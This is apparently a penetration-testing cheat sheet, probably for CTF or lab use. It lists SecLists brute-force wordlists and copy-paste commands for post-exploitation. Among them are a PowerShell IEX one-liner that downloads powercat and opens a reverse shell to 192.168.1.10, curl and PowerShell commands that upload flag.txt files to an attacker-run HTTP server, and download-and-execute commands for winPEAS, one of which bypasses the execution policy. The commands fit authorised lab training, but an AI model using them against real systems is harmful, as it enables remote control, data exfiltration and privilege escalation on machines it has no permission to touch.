# Cybersecurity Tools and Files
# Dictionaries
Web Directory Brute Force - Directory List 2.3 Small (87664 Lines)
```
https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/directory-list-2.3-small.txt
```
Web Directory Brute Force - Big.txt (20476 Lines)
```
https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/big.txt
```
Web Directory Brute Force - Common.txt (4727 Lines)
```
https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt
```
# PowerCat
```
https://raw.githubusercontent.com/voidascent/sec/main/powercat.ps1
```
```powershell
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.10/powercat.ps1');powercat -c 192.168.1.10 -p 9999 -e powershell
```
# HTTP Server for Upload and Download
```bash
https://raw.githubusercontent.com/voidascent/sec/main/httpserver.py
```
Usage
```bash
python3 httpserver.py # Default Port 8000
python3 httpserver.py -p 8888 # Running on Port to 8888
```
Curl (Linux and Windows cmd)
Curl Upload
```
curl -F 'file=@/home/ubuntu/Desktop/flag.txt' http://192.168.10.10:8000/
```
Curl Download
```
curl -O http://192.168.10.10:8000/download/linpeas.sh
```
PowerShell (Supported in PowerShell 3.0 and later)
PowerShell Upload
```
$FilePath = "C:\Users\Administrator\Desktop\flag.txt"; $Url = "http://192.168.10.10:8000/"; Add-Type -AssemblyName System.Net.Http; $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($FilePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, "file", [System.IO.Path]::GetFileName($FilePath)); $result = $client.PostAsync($Url, $content).Result; $result.Content.ReadAsStringAsync().Result
```
PowerShell Download
```
Invoke-WebRequest -Uri "http://192.168.10.10:8000/download/PowerUp.ps1" -OutFile "C:\Users\Administrator\Desktop\PowerUp.ps1"
```

# WinPEAS

Exe

```powershell
https://github.com/peass-ng/PEASS-ng/releases/download/20240602-829055f0/winPEASany.exe
```

Exe - Execution

```powershell
powershell -Command "iwr -Uri 'http://192.168.10.10:8888/winPEASx64.exe' -OutFile $env:temp\winPEASx64.exe; Start-Process $env:temp\winPEASx64.exe"
```

Ps1

```powershell
https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1
```

Ps1 - Execution

```powershell
powershell -Command "iwr -Uri 'http://192.168.10.10:8888/winPEAS.ps1' -OutFile $env:temp\winPEAS.ps1; Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass; & $env:temp\winPEAS.ps1"
```
```
